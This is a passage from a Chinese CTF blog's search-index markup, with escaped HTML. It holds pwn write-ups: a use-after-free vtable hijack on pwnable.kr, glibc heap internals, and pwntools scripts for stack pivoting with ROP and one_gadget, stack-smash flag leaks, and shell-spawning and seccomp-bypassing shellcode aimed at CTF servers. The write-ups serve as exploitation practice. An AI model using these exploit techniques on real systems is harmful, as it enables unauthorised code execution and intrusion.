#include &amp;lt;iostream&amp;gt; 
#include &amp;lt;cstring&amp;gt;
#include &amp;lt;cstdlib&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
using namespace std;

class Human{
private:
	virtual void give_shell(){
		system(&amp;quot;/bin/sh&amp;quot;);
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout &amp;lt;&amp;lt; &amp;quot;My name is &amp;quot; &amp;lt;&amp;lt; name &amp;lt;&amp;lt; endl;
		cout &amp;lt;&amp;lt; &amp;quot;I am &amp;quot; &amp;lt;&amp;lt; age &amp;lt;&amp;lt; &amp;quot; years old&amp;quot; &amp;lt;&amp;lt; endl;
	}
};

class Man: public Human{
public:
	Man(string name, int age){
		this-&amp;gt;name = name;
		this-&amp;gt;age = age;
        }
        virtual void introduce(){
		Human::introduce();
                cout &amp;lt;&amp;lt; &amp;quot;I am a nice guy!&amp;quot; &amp;lt;&amp;lt; endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this-&amp;gt;name = name;
                this-&amp;gt;age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout &amp;lt;&amp;lt; &amp;quot;I am a cute girl!&amp;quot; &amp;lt;&amp;lt; endl;
        }
};

int main(int argc, char* argv[]){
	Human* m = new Man(&amp;quot;Jack&amp;quot;, 25);
	Human* w = new Woman(&amp;quot;Jill&amp;quot;, 21);

	size_t len;
	char* data;
	unsigned int op;
	while(1){
		cout &amp;lt;&amp;lt; &amp;quot;1. use\n2. after\n3. free\n&amp;quot;;
		cin &amp;gt;&amp;gt; op;

		switch(op){
			case 1:
				m-&amp;gt;introduce();
				w-&amp;gt;introduce();
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout &amp;lt;&amp;lt; &amp;quot;your data is allocated&amp;quot; &amp;lt;&amp;lt; endl;
				break;
			case 3:
				delete m;
				delete w;
				break;
			default:
				break;
		}
	}

	return 0;	
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;源代码中 &lt;strong&gt;case3:&lt;/strong&gt; 里面free掉了m和w后并未将指针指向NULL，存在悬垂指针，可以有uaf；&lt;br&gt;
uaf即use after free，在悬垂指针后，再次重新分配内存，可以通过各种方式改写悬垂指针指向的内存空间地址，再次调用该指针时，将可能造成严重后果&lt;br&gt;
而&lt;code&gt;Man&lt;/code&gt;和&lt;code&gt;Woman&lt;/code&gt;是&lt;code&gt;Human&lt;/code&gt;的子类，虚表中存在父类的私有虚函数&lt;code&gt;give_shell()&lt;/code&gt;的地址，但并没有直接继承&lt;code&gt;Human&lt;/code&gt;的私有虚函数&lt;code&gt;give_shell()&lt;/code&gt;：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1678375061028.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;于是我们可以通过先找到虚表中&#39;give_shell()&#39;的地址（gdb调试过程中会出现&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1678376245302.png&#34; alt=&#34;0x401550&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;调用 &lt;strong&gt;case3:&lt;/strong&gt; 后使指针悬垂&lt;br&gt;
然后通过 &lt;strong&gt;case2:&lt;/strong&gt; 重新分配内存，之后再调用 &lt;strong&gt;case1:&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;case2:&lt;/strong&gt; 调用中argv[2]是从文件读入，读入长度跟之前定义&lt;code&gt;Human *m; Human *w&lt;/code&gt;时分配的内存大小相同为0x18，确保后续修改内存区域合适&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678376620004.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
可以在此处劫持&lt;code&gt;introduce()&lt;/code&gt;为&lt;code&gt;give_shell()&lt;/code&gt;,但是调用&#39;introduce()&#39;时调用的是虚函数指针+0x8处的，所以需要将地址-0x8，&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678376899366.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
使用&lt;code&gt;python -c &amp;quot;print(&#39;\x68\x15\x40\x00\x00\x00\x00\x00&#39;)&amp;quot; &amp;gt;~/文档/pwnable/uaf.txt&lt;/code&gt;打印不可见字符到文件&lt;br&gt;
之后再使用&lt;code&gt;./uaf 24 ~/文档/pwnable/uaf.txt&lt;/code&gt;从文件读入24个字节内容&lt;br&gt;
注意 &lt;strong&gt;case2:&lt;/strong&gt; 需要调用两次，原因是 &lt;strong&gt;case1:&lt;/strong&gt; 最开始调用m，而 &lt;strong&gt;case3:&lt;/strong&gt; 最后free的时w，需重新分配两次内存；&lt;br&gt;
最后可以getshell，pwnable.kr 的/tmp目录可写&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678378104148.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">pwnable.kr uaf wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/hIUbdZ-jy/"" data-c="
          &lt;p&gt;参考：&lt;a href=&#34;https://www.yuque.com/cyberangel/rg9gdm/uhdudz#y9ecP&#34;&gt;cyberangel&lt;/a&gt;&lt;br&gt;
与栈由高地址向地址值增长不同，堆由地址值向高地址增长，如图：&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678358275700.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
heap在函数调用malloc（brk增加）之后才会被分配&lt;br&gt;
堆内存管理的两种系统调用：&lt;code&gt;(s)brk&lt;/code&gt;和&lt;code&gt;mmap&lt;/code&gt;&lt;br&gt;
&lt;code&gt;(s)brk&lt;/code&gt;通过改变程序间断点位置，从而改变数据段长度，来分配内存&lt;br&gt;
&lt;code&gt;mmap&lt;/code&gt;通过在堆和栈之间找的一段空闲内存分配，并初始化为0&lt;br&gt;
当用户申请一段大于128kb的内存时选择&lt;code&gt;mmap&lt;/code&gt;而不是&lt;code&gt;(s)brk&lt;/code&gt;,&lt;br&gt;
&lt;a href=&#34;https://zhuanlan.zhihu.com/p/311527161&#34;&gt;zhihu&lt;/a&gt;&lt;br&gt;
同理，当空闲内存过多时&lt;code&gt;(s)brk&lt;/code&gt;也会通过改变自己指向的地址以缩减空余内存&lt;br&gt;
内存分配有以下特点：&lt;br&gt;
1.具有长生命周期的大内存分配使用mmap&lt;br&gt;
2.特别大的内存分配使用mmap&lt;br&gt;
3.具有短生命周期的内存分配使用(s)brk&lt;br&gt;
4.尽量只缓存临时使用的空闲小内存快，对大内存块或是长生命周期的大内存块在释放时都直接归还给操作系统&lt;br&gt;
5.对空闲的小内存块只会在malloc和free的时候进行合并，free时空闲内存块可能放入内存池中，不一定归还给操作系统&lt;br&gt;
6.收缩堆的条件时当前free的块大小加上前后能合并的chunk的大小大于64k，并且堆顶大小达到阈值，才有可能收缩堆，把堆最顶端的空闲内存返回给操作系统&lt;/p&gt;
&lt;p&gt;主线程首次调用malloc分配的内存也叫做main arena，非主线程malloc时产生thread arena&lt;br&gt;
如果main arena内存时通过mmap向系统分配的，free时会直接调用munmap将该内存归还给系统&lt;br&gt;
而free调用之后不仅会清空堆块的user data，还会将指向该堆块的指针存储到main_arena中（或是fastbin，注意指针和地址区别开，地址存放的指针，64位指针8字节，一个 arena 顶部的 chunk 叫做 Top chunk，它不属于任何 bin。当所有 bin 中都没有空闲的可用 chunk 时，我们切割 Top chunk 来满足用户的内存申请。假设 Top chunk 当前大小为 N 字节，用户申请了 K 字节的内存，那么 Top chunk 将被切割为：&lt;/p&gt;
&lt;p&gt;一个 K 字节的 chunk，分配给用户&lt;br&gt;
一个 N-K 字节的 chunk，称为 Last Remainder chunk&lt;br&gt;
后者成为新的 Top chunk。如果连 Top chunk 都不够用了，那么：&lt;/p&gt;
&lt;p&gt;在 main_arena 中，用 brk() 扩张 Top chunk&lt;br&gt;
在 non_main_arena 中，用 mmap() 分配新的堆&lt;/p&gt;
&lt;p&gt;对于堆中最小内存管理单位，chunk来说，分为allocated chunk，free chunk，top chunk，Last remainder chunk四种chunk，但又可以分为allocated chunk和free chunk两种，无论一个 chunk 的大小如何，处于分配状态还是释放状态，它们都使用一个统一的结构&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;/*
  This struct declaration is misleading (but accurate and necessary).
  It declares a &amp;quot;view&amp;quot; into memory allowing access to necessary
  fields at known offsets from a given base. See explanation below.
*/
struct malloc_chunk {

  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */

  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;

  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;allocated chunk：&lt;br&gt;
allocated chunck就是已经分配给用户的 chunk，其图示如下：&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678636230575.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;chunk：该 Allocated chunk 的起始地址；
mem：该 Allocated chunk 中用户可用区域的起始地址（= chunk + sizeof(malloc_chunk)）；
next_chunk：下一个 chunck（无论类型）的起始地址。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在图中，chunk 指针指向一个 chunk 的开始，一个 chunk 中包含了用户请求的内存区域和相关的控制信息。图中的 mem 指针才是真正返回给用户的内存指针。chunk 的第二个域的最低一位为 P，它表示前一个块是否在使用中，P 为 0 则表示前一个 chunk 为空闲，这时chunk 的第一个域 prev_size 才有效，prev_size 表示前一个 chunk 的 size，程序可以使用这个值来找到前一个 chunk 的开始地址。当 P 为 1 时，表示前一个 chunk 正在使用中，prev_size无效，程序也就不可以得到前一个chunk的大小。不能对前一个chunk进行任何操作。ptmalloc分配的第一个块总是将 P 设为 1，以防止程序引用到不存在的区域。&lt;br&gt;
Chunk 的第二个域的倒数第二个位为 M，他表示当前 chunk 是从哪个内存区域获得的虚拟内存。M 为 1 表示该 chunk 是从 mmap 映射区域分配的，否则是从 heap 区域分配的。Chunk 的第二个域倒数第三个位为 A，表示该 chunk 属于主分配区或者非主分配区，如果属于非主分配区，将该位置为 1，否则置为 0。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;free chunk：&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678636331695.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;prev_size: 两个相邻 free chunk 会被合并成一个，因此该字段总是保存前一个 allocated chunk 的用户数据；
size: 该字段保存本 free chunk 的大小；
fd: Forward pointer —— 本字段指向同一 bin 中的下个 free chunk（free chunk 链表的前驱指针）；
bk: Backward pointer —— 本字段指向同一 bin 中的上个 free chunk（free chunk 链表的后继指针）。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;当 chunk 空闲时，其 M 状态不存在，只有 AP 状态，原本是用户数据区的地方存储了四个指针，指针 fd 指向后一个空闲的 chunk，而 bk 指向前一个空闲的 chunk，ptmalloc 通过这两个指针将大小相近的 chunk 连成一个双向链表。对于 large bin 中的空闲 chunk，还有两个指针，fd_nextsize 和 bk_nextsize，这两个指针用于加快在 large bin 中查找最近匹配的空闲chunk。不同的 chunk 链表又是通过 bins 或者 fastbins 来组织的&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;bin:&lt;br&gt;
用户释放掉的 chunk 不会马上归还给系统，ptmalloc 会统一管理 heap 和 mmap 映射区域中的空闲的 chunk。当用户再一次请求分配内存时，ptmalloc 分配器会试图在空闲的 chunk 中挑选一块合适的给用户。这样可以避免频繁的系统调用，降低内存分配的开销。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ptmalloc 将相似大小的 chunk 用双向链表链接起来，这样的一个链表被称为一个 bin。Ptmalloc 一共 维护了 128 个 bin，并使用一个数组来存储这些 bin&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1679211420803.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678637134787.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;fastbin:&lt;br&gt;
共有10个fastbin&lt;br&gt;
管理 16、24、32、40、48、56、64 Bytes 的 free chunks（32位下默认）&lt;br&gt;
其中的 chunk 的 in_use 位（下一个物理相邻的 chunk 的 P 位）总为1&lt;br&gt;
当用户申请一个小于等于64bytes的空间时会首先检查对应大小的fastbin中是否包含未被使用的chunk，如果存在则直接将其从fastbin中移除并返回；否则通过其他方式（剪切top chunk）得到一块符合大小要求的chunk并返回&lt;/p&gt;
&lt;p&gt;small bin：&lt;br&gt;
如果程序请求的内存范围不在 fast bin 的范围内，就会考虑 small bin。简单点说就是大于 80 Bytes 小于某一个值时，就会选择它。&lt;/p&gt;
&lt;p&gt;unsorted bin：&lt;br&gt;
当 fast bin、small bin 中的 chunk 都不能满足用户请求 chunk 大小时，堆管理器就会考虑使用 unsorted bin 。它会在分配 large chunk 之前对堆中碎片 chunk 进行合并，以便减少堆中的碎片。&lt;br&gt;
unsorted bin 与 fast bin 不同，他使用双向链表对 chunk 进行连接&lt;/p&gt;
&lt;p&gt;unsorted 的字面意思就是” 不可回收” 的意思，可以看作将不可回收的垃圾（不满足能够进行内存分配的堆块）都放到这个” 垃圾桶” 中。&lt;/p&gt;
&lt;p&gt;large bin：&lt;br&gt;
当 fast bin、small bin 中的 chunk 都不能满足用户请求 chunk 大小时，就会考虑是不是 large bin。但是，其实在 large bin 中并没有直接去扫描对应 bin 中的 chunk，而是先利用 malloc_consolidate（参见 malloc_state 相关函数） 函数处理 fast bin 中的 chunk，将有可能能够合并的 chunk 先进行合并后放到 unsorted bin 中，不能够合并的就直接放到 unsorted bin 中，然后在大循环中进行相应的处理。&lt;/p&gt;
">glibc malloc机制略读</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/JI_Le20ep/"" data-c="
          &lt;p&gt;做了这道题才算是理解栈迁移了，之前那道栈迁移没搞懂原理就交差了（😓&lt;br&gt;
此题64位，保护仅开启nx，strings里面没有&lt;code&gt;system&lt;/code&gt;或&lt;code&gt;/bin/sh&lt;/code&gt;，考虑泄露libc基址&lt;br&gt;
本题有两次输入&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677918066895.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677918157930.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
第一次输入写入bss段上的一个地址，该地址起始为0x404080&lt;br&gt;
第二次输入buf，距离rbp为&lt;code&gt;0x20&lt;/code&gt;，但是限制输入长度为&lt;code&gt;0x30&lt;/code&gt;，则溢出长度仅有&lt;code&gt;0x8&lt;/code&gt;字节长，正常的rop链肯定行不通，于是考虑栈迁移&lt;br&gt;
栈迁移本质是利用两次&lt;code&gt;leave&lt;/code&gt;(将函数结束后的&lt;code&gt;ret_addr&lt;/code&gt;覆盖为&lt;code&gt;leave_ret_addr&lt;/code&gt;即可，劫持rsp寄存器，以及一次&lt;code&gt;ret&lt;/code&gt;达到利用的目的；下面是栈迁移的大致手绘思路（栈地址那块应为&lt;code&gt;old_rbp&lt;/code&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677918532328.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
第一次输入可以布置ROP链，第二次输入进行栈迁移&lt;br&gt;
选择在&lt;code&gt;bss_addr+0x60&lt;/code&gt;处进行布置，可以避免访问修改了与bss段相邻的got表，但第一次输入是在&lt;code&gt;bss_addr&lt;/code&gt;处开始，则我们需要&lt;code&gt;0x60&lt;/code&gt;的padding填充&lt;br&gt;
此题只需迁移1次栈，则迁移后伪栈的布置的&lt;code&gt;fake_addr&lt;/code&gt;可为任意值（如0xdeadbeef&lt;br&gt;
此后开始ROP链布置，第一次先泄露出libc基址，然后返回第二次溢出的read处，即&lt;code&gt;vuln()&lt;/code&gt;处；&lt;br&gt;
另外，此题溢出长度较短，无法传参调用&lt;code&gt;system(/bin/sh)&lt;/code&gt;，只能使用one_gadget&lt;br&gt;
还需要注意的一点是，最后read的padding为&lt;code&gt;0x27&lt;/code&gt;而不是&lt;code&gt;0x28&lt;/code&gt;在于末尾会多出一个换行符，如果&lt;code&gt;0x28&lt;/code&gt;则会导致最后ret地址多出1个字节内容,如图&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677919344060.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
正常情况下可以getshell&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677919357036.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./yichu2&amp;quot;)
elf=ELF(&amp;quot;./yichu2&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)

puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
puts_got=elf.got[b&amp;quot;puts&amp;quot;]
start=elf.sym[b&amp;quot;main&amp;quot;]

vuln=0x401227
pop_rdi_ret=0x4012a3
leave_ret=0x4011e0
bss_addr=0x404080 #0x404080
payload1=cyclic(0x60)+p64(0xdeadbeef)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(vuln)
# payload1=p64(one_gadget)

io.recvuntil(b&amp;quot;Name:\n&amp;quot;)
io.sendline(payload1)

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;ffer:\n&amp;quot;)
payload2=cyclic(0x20)+p64(bss_addr+0x60)+p64(leave_ret)
io.sendline(payload2)


base_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;).ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;] 
print(&amp;quot;base_addr:  &amp;quot;+hex(base_addr))
one_gadget=0x4f322+base_addr
print(&amp;quot;one_gadget:  &amp;quot;+hex(one_gadget))
# str_bin_sh=base_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
# print(&amp;quot;str_bin_sh:  &amp;quot;+hex(str_bin_sh))

# sys_addr=base_addr+libc.sym[b&amp;quot;system&amp;quot;]
# print(&amp;quot;sys_addr:  &amp;quot;+hex(sys_addr))

payload2=cyclic(0x27)+p64(one_gadget)
io.sendline(payload2)

io.interactive()




# Gadgets information
# ============================================================
# 0x00000000004011e0 : leave ; ret
# 0x000000000040129c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040129e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004012a0 : pop r14 ; pop r15 ; ret
# 0x00000000004012a2 : pop r15 ; ret
# 0x000000000040129b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040129f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040115d : pop rbp ; ret
# 0x00000000004012a3 : pop rdi ; ret
# 0x00000000004012a1 : pop rsi ; pop r15 ; ret
# 0x000000000040129d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 12
# 0x4f2c5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f322 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a38c execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">yichu2 wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/64O650yoM/"" data-c="
          &lt;p&gt;第二道64位stack smash题目，与上一道比较没有开启pie保护&lt;br&gt;
主函数直接将该题本体放出来&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677482258983.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
读入flag到&lt;code&gt;&amp;amp;buf&lt;/code&gt;处，gets()栈溢出覆盖到&lt;code&gt;__libc_argv[0]&lt;/code&gt;&lt;br&gt;
此题offset本地测出来又比平台多0x10，是个问题，可能是环境的问题，也可能是其它问题，needed&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677482413009.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
故exp如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./smash&amp;quot;)
io=remote(&amp;quot;43.143.7.97&amp;quot;,28537)
flag_addr=0x404060
payload=cyclic(0x1f8)+p64(flag_addr)
io.recvuntil(b&amp;quot;Luck.\n&amp;quot;)
io.sendline(payload)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[HNCTF 2022 WEEK3]smash wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/CXTYzf2Lz/"" data-c="
          &lt;p&gt;*此题未实际用到rbp寄存器，猜测是rsp寻址&lt;br&gt;
64位stack smash题目,保护全开，主函数中存在gets()可以栈溢出&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677479101722.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
而本题存在&lt;code&gt;__stack_chk_fail&lt;/code&gt;，并且&lt;code&gt;sub_CF0&lt;/code&gt;函数可以将flag读入到偏移为0x202040处，意味着可以利用stack smash泄露出flag&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677479354508.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
则我们可以考虑泄露程序基地址从而获取flag_addr,再通过stack smash将flag打印出来&lt;br&gt;
此时第一次输入限制长度为16 bytes，可以输入泄露函数内存地址在减去高位偏移获取程序基址&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677479564976.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
然后输入backdoor将flag读入&lt;br&gt;
接下来定位&lt;code&gt;__libc_argv[0]&lt;/code&gt;所在位置，它作为指针指向内存地址可以作为我们stack smash利用的关键，再通过发生溢出的位置与它的偏移确定垃圾数据长度，但是此题gdb动态调试时确定溢出点时发现&lt;code&gt;$rbp-0x88&lt;/code&gt;地址偏了十万八千里，需要通过&lt;code&gt;$rsp+0x20&lt;/code&gt;来获取溢出点地址，猜测此题可能是rsp寻址&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677479962101.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
不过此题本地调试测出来offset是0x178，与远端0x168不符，原因暂时还没搞懂😿&lt;br&gt;
另外此题只有再次输入&#39;exitexit&#39;才能结束循环&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677480094183.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import*
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./easyecho&amp;quot;)
io=remote(&amp;quot;1.14.71.254&amp;quot;,28981)

io.recvuntil(b&amp;quot;: &amp;quot;)
payload=b&amp;quot;a&amp;quot;*15+b&amp;quot;b&amp;quot;
io.sendline(payload)
io.recvuntil(b&amp;quot;b&amp;quot;)

base_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-0xcf0
print(&amp;quot;base_addr  &amp;quot;+hex(base_addr))

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;Input: &amp;quot;)
io.sendline(b&amp;quot;backdoor&amp;quot;)

flag_addr=base_addr+0x202040
payload=cyclic(0x168)+p64(flag_addr)
io.recvuntil(b&amp;quot;Input: &amp;quot;)
io.sendline(payload)

io.recvuntil(b&amp;quot;Input: &amp;quot;)
io.sendline(b&amp;quot;exitexit&amp;quot;)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[2021 鹤城杯]easyecho wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/-Mc1qDHO8/"" data-c="
          &lt;p&gt;3/4，有一道运气好暴力脚本出来的，最后一题rust逆向...&lt;br&gt;
&lt;strong&gt;myexec&lt;/strong&gt;&lt;br&gt;
mmap开辟了一块可写区间，read函数写入该区间&lt;br&gt;
直接shellcode发送shellcraft.sh()就行了&lt;br&gt;
exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;)

# io=process(&amp;quot;./service&amp;quot;)
io=remote(&amp;quot;43.143.7.127&amp;quot;,28003)

shellcode=asm(shellcraft.sh())
io.recvuntil(b&amp;quot;\n&amp;quot;)
io.sendline(shellcode)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;br&gt;
&lt;strong&gt;mymem&lt;/strong&gt;&lt;br&gt;
函数主体和上一题一样，不过此题seccomp-tools dump出来发现限制了&lt;code&gt;sys_number&lt;/code&gt;&lt;br&gt;
不过可以构造&lt;code&gt;open(&amp;quot;&amp;quot;)+read(&amp;quot;&amp;quot;)+write()&lt;/code&gt;的函数调用来绕过&lt;br&gt;
exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;)

# io=process(&amp;quot;./mymem&amp;quot;)
io=remote(&amp;quot;43.143.7.127&amp;quot;,28391)
tp_addr=0x50000


shellcode=asm(shellcraft.open(&amp;quot;/home/ctf/flag.txt&amp;quot;))+asm(shellcraft.read(3,tp_addr,50))+asm(shellcraft.write(1,tp_addr,50))
io.recvuntil(b&amp;quot;\n&amp;quot;)
io.sendline(shellcode)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;br&gt;
&lt;strong&gt;oldfashion&lt;/strong&gt;&lt;br&gt;
&lt;s&gt;非预期了&lt;/s&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;)


# io=process(&amp;quot;./zzzzz&amp;quot;)
io=remote(&amp;quot;43.142.108.3&amp;quot;,28524)
while 1:
    io.sendline(b&amp;quot;2&amp;quot;)
    if io.recv()==(b&amp;quot;Congratulations! You guessed the number correctly.\n&amp;quot;):
        break

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">NSSCTF Round#9 Basic. 部分wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/06adMi_L5/"" data-c="
          &lt;p&gt;参考&lt;a href=&#34;https://blog.csdn.net/K1ose/article/details/116035405?spm=1001.2101.3001.6650.3&amp;amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-3-116035405-blog-116607161.pc_relevant_default&amp;amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-3-116035405-blog-116607161.pc_relevant_default&amp;amp;utm_relevant_index=3&#34;&gt;博客链接&lt;/a&gt;&lt;br&gt;
第一次做orw沙盒类题目，此类题目一般是禁用系统调用&lt;br&gt;
使用&lt;code&gt;$seccomp-tools dump ./orw&lt;/code&gt;查看调用，发现开启open,write,read等等函数，可以利用这些函数读取flag并打印出来&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677216184304.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
而主函数则提示shellcode，可以利用shellcode调用这三个函数&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677216378453.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
于是exp如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

# io=process(&amp;quot;./orw&amp;quot;)
